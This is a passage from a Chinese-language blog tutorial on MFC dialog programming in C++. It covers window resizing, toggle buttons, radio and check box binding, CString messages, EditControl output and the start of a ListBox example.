cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetWindowRect</span>(m_large);</span><br><span class="line">m_small = m_large;</span><br><span class="line">m_small.right = m_small.left + m_small.<span class="built_in">Width</span>() / <span class="number">2</span>;</span><br><span class="line">m_small.bottom = m_small.top + m_small.<span class="built_in">Height</span>() / <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>最后给放大缩小实现一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnLarge</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;<span class="comment">//获取当前窗口尺寸信息</span></span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_large.<span class="built_in">Width</span>(), m_large.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnSmall</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;</span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_small.<span class="built_in">Width</span>(), m_small.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SWP_NOZORDER：忽略第一个参数；SWP_NOMOVE：忽略x、y，维持位置不变</strong></p><p>curRect都是为了先获取当前窗口尺寸<br>所以当setwindowpos的时候，xy不需要改变，cx和cy则是用m_large和m_small改变。<br>不过因为m_large初始化的时候是直接根据当前窗口大小来的，所以一开始点击放大是没有反应的，当缩小了之后在点击放大才会改变回原有尺寸</p><img src="/2022/07/25/mfc01/063.png" class=""><p>这里调整了一下俩按钮的位置，因为没有加滑动条，所以缩小了原有位置就够不到了。</p><img src="/2022/07/25/mfc01/064.png" class=""><p>不过可以看出上述按钮实现雷同点比较多。<br>那么就有一个骚操作，就是通过获取按钮标签名去改变</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnLarge</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;<span class="comment">//获取当前窗口尺寸信息</span></span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"></span><br><span class="line">CWnd *pButton = <span class="built_in">GetDlgItem</span>(IDC_BTN_LARGE);</span><br><span class="line">CString strTitle;</span><br><span class="line"><span class="keyword">if</span> ( pButton ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">GetWindowText</span>(strTitle);</span><br><span class="line"><span class="keyword">if</span> ( strTitle == _T(<span class="string">&quot;放大&quot;</span>) ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;缩小&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_large.<span class="built_in">Width</span>(), m_large.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;放大&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line">m_small.<span class="built_in">Width</span>(), m_small.<span class="built_in">Height</span>(),</span><br><span class="line">SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/065.png" class=""><img src="/2022/07/25/mfc01/066.png" class=""><img src="/2022/07/25/mfc01/067.png" class=""><p>先点击放大，发现按钮名变成缩小了，然后再次点击，窗口缩小，按钮名称变成放大，再点击就放大了，按钮名称就变成缩小。</p><p>所以另一个按钮就没有存在的必要了，把这个放大按钮的名称改成缩小，这样一来开头的光变名字就可以省去了。</p><p>最后做一个安全的设计</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnLarge</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;<span class="comment">//获取当前窗口尺寸信息</span></span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"></span><br><span class="line">CWnd *pButton = <span class="built_in">GetDlgItem</span>(IDC_BTN_LARGE);</span><br><span class="line">CString strTitle;</span><br><span class="line"><span class="keyword">if</span> ( pButton ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">GetWindowText</span>(strTitle);</span><br><span class="line"><span class="keyword">if</span> ( strTitle == _T(<span class="string">&quot;放大&quot;</span>) &amp;&amp; (m_large.<span class="built_in">IsRectEmpty</span>() == FALSE) ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;缩小&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_large.<span class="built_in">Width</span>(), m_large.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ( m_large.<span class="built_in">IsRectEmpty</span>() == FALSE ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;放大&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line">m_small.<span class="built_in">Width</span>(), m_small.<span class="built_in">Height</span>(),</span><br><span class="line">SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IsRectEmpty()</code>主要是为了判断这个窗口如果left、top、right、bottom都一样的话，说明这个窗口就只有一个点，并没有办法完成缩放和放大了。</p><blockquote><p>窗口其实除了大小，就是绘制的位置，有的时候不是在当前窗口之上绘制，就有可能掉下去一层跟后面的窗口平级，至于窗口为什么能叠加，应该是除了xy，还有一个z轴，是3d模型的经典概念。</p></blockquote><hr><h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><p>空间交互，首先要创建控件或者说拖个出来，交互，就需要绑定控件或者变量，在消息中有来有回实现一些功能。</p><p>例如上述所学到的函数<code>GetDlgItem</code>，他就可以通过控件id获取到对应的控件<br><code>CListBox *list  = (CListBox*)GetDlgItem(控件id)</code></p><p>绑定控件和变量，在消息中曾使用到<code>UpdateData(TRUE|FALSE)</code>，默认不填写为TRUE，也就是将控件内容第一时间同步到变量上，FALSE则是将变量同步回控件</p><hr><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p>随便建个mfc项目，选择对话框类型，有的没的取消勾选</p><img src="/2022/07/25/mfc01/069.png" class=""><p>然后绘制这样的窗口，其中radio和check按钮，最后一个button</p><p>性别直接添加一个变量就可以了，原本想着用bool类型，但是考虑到得有个初始值，其实这个初始化关系到也不是特别大，但此处就换个万一弄弄，用int来表示，那么就需要注意了，你需要修改初始化部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMFCButtonDlg::<span class="built_in">CMFCButtonDlg</span>(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">: <span class="built_in">CDialogEx</span>(IDD_MFCBUTTON_DIALOG, pParent)</span><br><span class="line">    , <span class="built_in">m_sex</span>(<span class="number">-1</span>)&#123;</span><br><span class="line">m_hIcon = <span class="built_in">AfxGetApp</span>()-&gt;<span class="built_in">LoadIcon</span>(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>m_sex为我们添加的变量名，括号代表初始化值，默认是0，但这里的思路是-1为未初始化，0为男 1为女这样。</p><p>如此一来，结果那个按钮第一步就可以上手了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_T只是为了兼容unicode，在你的项目编码是ANSI的时候下次转换能保证字符串不出错，其次还有一个_L，它是不管编译方式都按unicode保存</strong></p><p><strong>万国码通用保存2两字节，ANSI英文一字节汉语两字节，再次强调</strong></p><p><code>MB_ICONEXCLAMATION</code>是一个警告图标，不同于<code>SWP_NOZORDER</code>，前者为黄色感叹号，后者为红色x号。</p><p>然后打印，肯定就要用CString了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = _T(<span class="string">&quot;您的性别是：&quot;</span>) + (m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>);</span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run的时候会发现</p><img src="/2022/07/25/mfc01/070.png" class=""><p>额前面那句好像没有加上，原因应该是Cstring没有重写string+string吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>));</span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后：</p><img src="/2022/07/25/mfc01/071.png" class=""><p>对于多选框，类型一般还是bool比较合适，但是默认的添加变量都是单个类型，所以我们在自动的基础上，给他改成数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 爱好</span></span><br><span class="line">BOOL m_hobby[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>那么在源文件就要注意：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CMFCButtonDlg::<span class="built_in">CMFCButtonDlg</span>(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">: <span class="built_in">CDialogEx</span>(IDD_MFCBUTTON_DIALOG, pParent)</span><br><span class="line">    , <span class="built_in">m_sex</span>(<span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">memset</span>(m_hobby, <span class="number">0</span>, <span class="built_in">sizeof</span>(m_hobby));</span><br><span class="line"></span><br><span class="line">m_hIcon = <span class="built_in">AfxGetApp</span>()-&gt;<span class="built_in">LoadIcon</span>(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RAD_MAN, m_sex);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CK_FB, m_hobby[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CK_BKB, m_hobby[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CK_YOGA, m_hobby[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手动修改成数组</p><p>最后完善一下结果消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>));</span><br><span class="line">strMsg += _T(<span class="string">&quot;你的爱好有：&quot;</span>);</span><br><span class="line">CString hobby[<span class="number">3</span>]&#123; _T(<span class="string">&quot;足球&quot;</span>),_T(<span class="string">&quot;篮球&quot;</span>),_T(<span class="string">&quot;瑜伽&quot;</span>) &#125;;</span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( m_hobby[i] )&#123;</span><br><span class="line">strMsg += hobby[i] + _T(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/072.png" class=""><p>就ok了，这两个按钮的应用还算基础的。</p><p>当然自己定义数组一个办法，也可以通过控件id，get他的name<br>至于说这个id该通过什么办法<br>比如项目头文件里面有个叫<code>Resource.h</code>的，打开之后会看到他宏定义了我们跟控件有关的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IDD_MFCBUTTON_DIALOG            102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDR_MAINFRAME                   128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BUTTON1                     1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BTN_RESULT                  1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_RAD_MAN                     1001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_RAD_WOMEN                   1002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_CK_FB                       1003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_CK_BKB                      1004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_CK_YOGA                     1005</span></span><br></pre></td></tr></table></figure><p>复选框就看后面仨，有了这个其实会容易很多，因为他们是连续的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>));</span><br><span class="line">strMsg += _T(<span class="string">&quot;你的爱好有：&quot;</span>);</span><br><span class="line"><span class="comment">//CString hobby[3]&#123; _T(&quot;足球&quot;),_T(&quot;篮球&quot;),_T(&quot;瑜伽&quot;) &#125;;</span></span><br><span class="line"></span><br><span class="line">UINT nId = IDC_CK_FB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( m_hobby[i] )&#123;</span><br><span class="line"><span class="comment">//strMsg += hobby[i] + _T(&quot; &quot;);</span></span><br><span class="line">CString sName;</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(nId + i, sName);</span><br><span class="line">strMsg += sName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为从足球开始，后面只需要+1就可以得到，倒是省了定义一个数组。</p><img src="/2022/07/25/mfc01/073.png" class=""><p><strong>但是这个是基于你这几个复选框是连续的，id才能跟的上，不然跟数组没啥太大差别</strong></p><hr><h3 id="EditControl"><a href="#EditControl" class="headerlink" title="EditControl"></a>EditControl</h3><p>工具箱里找</p><img src="/2022/07/25/mfc01/074.png" class=""><p>然后拖出来，稍微调整一下大小</p><img src="/2022/07/25/mfc01/075.png" class=""><p>对应的属性也有不少，好在2022都做成中文了</p><img src="/2022/07/25/mfc01/076.png" class=""><p>这玩意说实在没啥必要演示，自己试几下就行了，但是有个基础应用的地方到时跟上面能联动<br>就是将我们选完之后的内容打印在editcontrol中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\r\n&quot;</span>) : _T(<span class="string">&quot;女\r\n&quot;</span>));</span><br><span class="line">strMsg += _T(<span class="string">&quot;你的爱好有：&quot;</span>);</span><br><span class="line"><span class="comment">//CString hobby[3]&#123; _T(&quot;足球&quot;),_T(&quot;篮球&quot;),_T(&quot;瑜伽&quot;) &#125;;</span></span><br><span class="line"></span><br><span class="line">UINT nId = IDC_CK_FB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( m_hobby[i] )&#123;</span><br><span class="line"><span class="comment">//strMsg += hobby[i] + _T(&quot; &quot;);</span></span><br><span class="line">CString sName;</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(nId + i, sName);</span><br><span class="line">strMsg += sName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CEdit* edit = (CEdit*)<span class="built_in">GetDlgItem</span>(IDC_EDIT1);</span><br><span class="line"><span class="comment">//edit-&gt;GetWindowTextW();</span></span><br><span class="line">edit-&gt;<span class="built_in">SetWindowText</span>(strMsg);<span class="comment">//设置文本</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中要注意editcontrol属性要设置几个地方</p><ol><li>多行 true</li><li>想要返回 true</li><li>就是写入的strMsg想要换行，要在中间加<code>\r\n</code>，单纯的<code>\n</code>好像不起作用</li></ol><p>效果就是如下：</p><img src="/2022/07/25/mfc01/077.png" class=""><p>点击完成后往edit里面写入，和弹出对话框</p><img src="/2022/07/25/mfc01/078.png" class=""><hr><h3 id="ListBox"><a href="#ListBox" class="headerlink" title="ListBox"></a>ListBox</h3><p>老样子在dialog界面打开工具箱，找到listbox</p><img src="/2022/07/25/mfc01/079.png" class=""><p>然后属性都是中文名了，实在不行点击一下下面还有介绍，再不济就自己修改试试</p><img src="/2022/07/25/mfc01/080.png" class=""><p>随便搞个例子试试</p><img src="/2022/07/25/mfc01/082.png" class=""><p>先绘制这样的界面，然后就是往里面addsttring，最后根据选中的返回结果这样。</p><blockquote><p>别忘了给listbox添加变量</p></blockquote><p>双击test按钮</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span 